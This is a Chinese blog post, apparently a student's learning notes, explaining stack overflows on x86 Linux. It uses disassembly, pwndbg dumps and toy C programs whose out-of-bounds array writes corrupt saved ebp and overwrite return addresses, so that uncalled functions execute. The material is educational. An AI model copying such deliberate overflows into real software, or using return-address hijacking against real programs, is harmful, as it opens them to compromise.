<!-- build time: Wed Sep 10 2025 16:11:04 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta http-equiv="X-UA-COMPATIBLE" content="IE=edge,chrome=1"><meta name="renderer" content="webkit"><link rel="icon" type="image/ico" sizes="32x32" href="/assets/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><meta name="google-site-verification" content="ZTJV7LmnjnAU0rDyvzCr7TRRA440DNEQPOSHt9OiYLE"><link rel="alternate" href="/rss.xml" title="symlpigeon's little gensokyo" type="application/rss+xml"><link rel="alternate" href="/atom.xml" title="symlpigeon's little gensokyo" type="application/atom+xml"><link rel="alternate" type="application/json" title="symlpigeon's little gensokyo" href="http://symlpigeon.github.io/feed.json"><link rel="preconnect" href="https://s4.zstatic.net"><link rel="preconnect" href="https://at.alicdn.com"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CFredericka%20the%20Great:400,400italic,700,700italic%7CNoto%20Serif%20JP:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CInconsolata:400,400italic,700,700italic&display=swap&subset=latin,latin-ext" media="none" onload="this.media&#x3D;&#39;all&#39;"><link rel="stylesheet" href="/css/app.css?v=0.4.25"><link rel="modulepreload" href="/js/chunk-4ZVORXXI.js"><link rel="modulepreload" href="/js/chunk-QTIRA53W.js"><link rel="modulepreload" href="/js/copy-tex-SCXHUQKS.js"><link rel="modulepreload" href="/js/post-XSNAZ6TV.js"><link rel="modulepreload" href="/js/quicklink-P2UCCMRY.js"><link rel="modulepreload" href="/js/siteInit.js"><link rel="preload" href="/assets/index-bg.jpg" as="image" fetchpriority="high"><meta name="keywords" content="栈溢出"><meta name="description" content="关于栈溢出，还有其他一些奇怪的利用姿势。"><link rel="canonical" href="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/"><script src="https://cdn.jsdelivr.net/npm/echarts@5.4.0/dist/echarts.min.js"></script><style type="text/css">#categories-chart,#categories-radar,#posts-calendar,#posts-chart,#tags-chart{width:100%;height:300px;margin:.5rem auto;padding:.5rem;overflow-x:auto}</style><title>关于栈溢出的一些东西（基本的）</title><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">关于栈溢出的一些东西（基本的）</h1><div class="meta"><span class="item" title="创建时间：2022-03-28 21:29:58"><span class="icon"><i class="ic i-calendar"></i></span><span class="text">发表于</span><time itemprop="dateCreated datePublished" datetime="2022-03-28T21:29:58+08:00">2022-03-28</time></span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i></span><span class="text">本文字数</span><span>17k</span><span class="text">字</span></span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i></span><span class="text">阅读时长</span><span>15 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span><span class="line"></span><span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Another Gensokyo</a></li></ul><ul class="right" id="rightNav"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div class="pjax" id="imgs"><img src="/assets/index-bg.jpg" loading="eager" decoding="async" fetchpriority="high" alt="symlpigeon's little gensokyo"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"></path></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"></use><use xlink:href="#gentle-wave" x="48" y="3"></use><use xlink:href="#gentle-wave" x="48" y="5"></use><use xlink:href="#gentle-wave" x="48" y="7"></use></g></svg></div><main><div class="inner"><div class="pjax" id="main"><div class="article wrap"><div class="breadcrumb" itemlistelement itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i><span><a href="/">首页</a></span><i class="ic i-angle-right"></i><span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="item" rel="index" title="分类于二进制"><span itemprop="name">二进制<meta itemprop="position" content="0"></span></a></span><i class="ic i-angle-right"></i><span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/Pwn/" itemprop="item" rel="index" title="分类于Pwn"><span itemprop="name">Pwn<meta itemprop="position" content="1"></span></a></span></div><article class="post block" itemscope itemtype="http://schema.org/Article" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://symlpigeon.github.io/2022/03/28/stackoverflow-learn/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/assets/avatar.png"><meta itemprop="name" content="神隐陌路/symlPigeon"><meta itemprop="description" content="神隐陌路的个人小站, 夢違え、幻の朝靄の世界の記憶を"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="symlpigeon's little gensokyo"></span><div class="body md" itemprop="articleBody"><p><em>栈溢出应该算是一个十分基础的东西了，之前自己学过，然后过了一阵子就忘了…… 这次争取别忘掉。</em></p><h1 id="栈怎么就溢出了"><a class="anchor" href="#栈怎么就溢出了">#</a> 栈怎么就溢出了</h1><p>我们在数据结构中所学的栈是一种特殊的数据结构，它满足先进后出，后进先出的特性。</p><p>在 Linux 下，一个程序的地址空间实际上是这样的形态（当然我们并不需要去考虑操作系统层面和硬件层面的虚拟内存等问题）：</p><p><img loading="lazy" data-src="mem_org.jpg" alt=""></p><p>其中有两段，即 stack 和 heap，是可以动态变化的。stack 对应了我们所说的栈，而 heap 对应了我们所说的堆。</p><p>从图像中也可以看出来，栈的增长是从高地址到低地址的 —— 也就是说，栈底出于高地址的位置，而栈顶处在低地址的位置。x86 寄存器中的栈指针即 esp，就指明了栈顶的位置，而栈基指针 ebp 则指明了栈底的位置。</p><p>一般来说，在函数中定义的局部变量等，都会被定义在栈上，而通过 <code>malloc</code> 分配的变量对应的空间则是在堆上。</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 在栈上</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">char</span> <span class="token operator">*</span>b <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span> <span class="token operator">*</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 在堆上</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="函数的调用还有返回发生了什么"><a class="anchor" href="#函数的调用还有返回发生了什么">#</a> 函数的调用还有返回发生了什么</h2><p>每当我们去调用一个函数的时候，我们都需要遵循一定的规则，这个规则也就是调用惯例。<a href="/2022/02/15/re-call/">之前</a>专门详细分析了几种调用惯例，这里不多说了，直接就拿最简单的来说。</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">int</span> <span class="token function">inc</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">int</span> b <span class="token operator">=</span> a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">return</span> b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    a <span class="token operator">=</span> <span class="token function">inc</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在这段程序中，在调用函数 <code>inc(a)</code> 之前， <code>main()</code> 函数做了这样的事情：</p><pre><code class="language-x86asm">11b2:       c7 45 f4 01 00 00 00    mov    DWORD PTR [ebp-0xc],0x1
            ; 将变量a赋值为1（这一步实际上并不属于函数调用的部分）

11b9:       ff 75 f4                push   DWORD PTR [ebp-0xc]
            ; 将参数压栈（CDECL调用）
11bc:       e8 cc ff ff ff          call   118d &lt;inc&gt;
            ; 调用函数inc
11c1:       83 c4 04                add    esp,0x4
            ; 函数返回之后清理栈（栈顶加4就相当于把前面push DWORD PTR [ebp-0xc]这句占据的空间顶回来）
</code></pre><p>在 x86 中， <code>call addr</code> 这条指令做的是这样的事情：将当前指令的下一条指令（上文中的 add esp,0x4 这句指令）地址压入栈中，并掉转到 <code>addr</code> 对应的地址。</p><p>执行完了上面的指令之后，程序就会跳转进入 <code>inc()</code> 函数中。我们来看这个函数的指令：</p><pre><code class="language-x86asm">        ; 下面的两条指令也就是所谓的函数序言
118d:       55                      push   ebp
        ; 将现在的ebp（实际上也就是之前main函数的栈基址）压入栈中
118e:       89 e5                   mov    ebp,esp
        ; 将ebp设定为esp，也就是现在的栈顶就是现在的栈基址

1190:       83 ec 10                sub    esp,0x10
        ; 开辟现在inc函数的栈空间（实际上多开了一部分空间）
</code></pre><p>在执行完了这些部分之后，函数的堆栈实际上是这个样子的：</p><p><img loading="lazy" data-src="stack_of_inc.jpg" alt=""></p><p>接下来的几条指令负责计算函数的结果：</p><pre><code class="language-x86asm">1193:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
    ; 从栈上获取参数
1196:       83 c0 01                add    eax,0x1
1199:       89 45 fc                mov    DWORD PTR [ebp-0x4],eax
    ; 实际上DWORD PTR [ebp-0x4]这个位置就对应了函数inc中的局部变量b
119c:       8b 45 fc                mov    eax,DWORD PTR [ebp-0x4]
</code></pre><p>接下来的部分就是函数最后的一些操作：</p><pre><code class="language-x86asm">119f:       c9                      leave  
11a0:       c3                      ret   
</code></pre><p><code>leave</code> 指令等价于 <code>mov esp, ebp</code> 并 <code>pop ebp</code> 。这条指令的作用在于清楚函数的栈，执行完之后，函数的栈是现在这样的情况：</p><p><img loading="lazy" data-src="stack_of_inc_after_leave.jpg" alt=""></p><p>注意现在栈顶上的值是函数的返回地址 —— 也就是说，下一步执行 <code>ret</code> 语句之后，程序就会跳转到这个返回地址（当然同时会把栈顶的元素弹出）。</p><p>接下来 main 函数会执行一部分的清栈工作等等（实际上对于 stdcall 和 fastcall 又是不一样的情况）。</p><h2 id="如果栈塞不下了"><a class="anchor" href="#如果栈塞不下了">#</a> 如果栈塞不下了……</h2><p>上面的例子中，函数里的局部变量是一个 4 字节的 int 类型。一个问题在于，如果函数里面有一个数组，那么在内存中是怎么样的布局？</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>我们来测试一下：</p><pre><code>pwndbg&gt; stack 16
00:0000│ esp 0xffffd530 —▸ 0xf7fbd3e0 —▸ 0xf7d4a000 ◂— 0x464c457f
01:0004│     0xffffd534 ◂— 0x0
02:0008│     0xffffd538 ◂— 0xbfebfbff
03:000c│     0xffffd53c ◂— 0x1
04:0010│     0xffffd540 ◂— 0x2
05:0014│     0xffffd544 ◂— 0x3
06:0018│     0xffffd548 ◂— 0x4
07:001c│     0xffffd54c ◂— 0x5
08:0020│ ebp 0xffffd550 —▸ 0xffffd558 —▸ 0xf7ffcb80 (_rtld_local_ro) ◂— 0x0
09:0024│     0xffffd554 —▸ 0x565561b1 (main+8) ◂— mov    eax, 0
</code></pre><p>可以看出来，栈上面的这个数组增长的顺序是和栈的增长方向是反过来的 —— 数组中前面的元素在靠近栈顶的地方，后面的元素在靠近栈底的地方。</p><p>这样一个问题就来了，如果这个局部变量占了实际上超过了我们给它大小的空间会发生什么事情？</p><p>我们可以试一下。</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">void</span> <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token comment">// 实际上这就是一个常见的数组越界访问的问题。</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>运行一下，然后：</p><pre><code>Job 1, './a.out' terminated by signal SIGSEGV (Address boundary error)
</code></pre><p>SIGSEGV 是段错误。<br>我们可以追踪一下哪里出了问题。</p><p><img loading="lazy" data-src="bad_test_asm1.jpg" alt=""></p><p>从 gdb 的调试中我们可以看到， <code>a[5] = 6;</code> 这句话对应了 <code>mov dword ptr [ebp], 6</code> 这条指令。这条指令显然覆盖了 <code>EBP</code> 位置上面的值，这个值如果看上面的图的话，应该就能够发现这个地址上就是 <code>main</code> 函数的基址。</p><p>在 <code>leave</code> 指令之后， <code>main</code> 函数的 <code>ebp</code> 的值是 0x2。</p><p>我们把程序调试到那个位置上：</p><p><img loading="lazy" data-src="bad_test_asm2.jpg" alt=""></p><p>下一步是 <code>push dword ptr [ebp - 0xc]</code> ，可是 <code>EBP</code> 的值是 0x6！</p><p>很明显：</p><pre><code>Program received signal SIGSEGV, Segmentation fault.
</code></pre><p>段错误。在 <code>main</code> 函数试图访问某个地址的时候出现了问题 —— <code>main</code> 函数并不知道自己的 <code>ebp</code> 已经被修改了，它仍在试图去访问基于 <code>ebp</code> 偏移的栈上的变量 —— 而这个内存地址现在是不合法的了。</p><p>前面是修改了栈基址，如果我们能够更进一步去修改返回地址呢？</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">void</span> <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token comment">// 实际上这就是一个常见的数组越界访问的问题。</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    a<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token comment">// 更过分了（</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>根据上面的情况，我们可以猜到当函数执行 <code>ret</code> 的时候，会返回到一个错误的地址。</p><p><img loading="lazy" data-src="bad_test_stack.jpg" alt=""></p><p>在执行完函数中的赋值操作之后，程序的栈是这个样子。接下来在返回时，整个程序的栈更是惨不忍睹：</p><p><img loading="lazy" data-src="bad_test_corrupt_stack.jpg" alt=""></p><p>下面一步 <code>ret</code> 到的地方自然是无效的地址，程序在这之后就会崩溃。</p><p>这个也就是所谓的 “栈溢出”。</p><h1 id="能不能利用"><a class="anchor" href="#能不能利用">#</a> 能不能利用</h1><h2 id="控制流是不是出问题了"><a class="anchor" href="#控制流是不是出问题了">#</a> 控制流是不是出问题了？</h2><p><code>ret</code> 指令会返回到现在栈顶上存放的地址。那么如果我们任意修改这个位置上的值，理论上也就能够让程序跳转到任意一个地方了。</p><p>前面程序出现了 SIGSEGV 是因为执行的地址无效，我们现在需要的是填一个有效的地址进去：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">void</span> <span class="token function">impossible</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you can't see me!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">void</span> <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    a<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>impossible<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在运行之后，我们可以看到程序输出了：</p><pre><code>$ ./a.out
you can't see me!
fish: Job 1, './a.out' terminated by signal SIGSEGV (Address boundary error)
</code></pre><p>很明显， <code>impossible</code> 这个从来没被调用的函数被执行了。在执行完函数 <code>bad_test</code> 后，程序尝试返回到 <code>main</code> 函数。但是这个时候 <code>main</code> 函数的返回地址已经被替换成了 <code>impossible</code> 函数的地址 —— 程序就会转而去执行这个 <code>impossible</code> 函数。</p><p>这也就是说明了程序为什么会执行 <code>impossible</code> 函数。</p><p>再进一步看，我们的程序是通过 <code>ret</code> 指令进入到 <code>impossible</code> 函数中的，和正常的函数调用并不一样 —— 这时候并没有一个 <code>call impossible</code> 指令去把执行完之后的返回地址压入栈中。也就是说，程序执行完 <code>impossible</code> 之后，它就不知道该返回哪里了。本来在执行 <code>impossible</code> 函数的 <code>ret</code> 指令时，栈顶应该是调用方压好的返回地址，但是没人去做这件事，栈顶现在是先前某个函数执行过程中留下的痕迹。</p><p>然后，程序就会跳转到这个不知道哪里的地方，接着程序就会崩溃。</p><p>实际上我们可以做一些更有趣的事情：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">void</span> <span class="token function">impossible</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you can't see me!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">void</span> <span class="token function">impossible_too</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you can't see me too!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">void</span> <span class="token function">impossible_too_too</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you can't see me too, too!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">void</span> <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    a<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>impossible<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    a<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>impossible_too<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    a<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>impossible_too_too<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token function">bad_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>一个程序的栈中被溢出了多个地址，这是它输出发生的变化：</p><pre><code>$ ./a.out
you can't see me!
you can't see me too!
you can't see me too, too!
fish: Job 1, './a.out' terminated by signal SIGSEGV (Address boundary error)
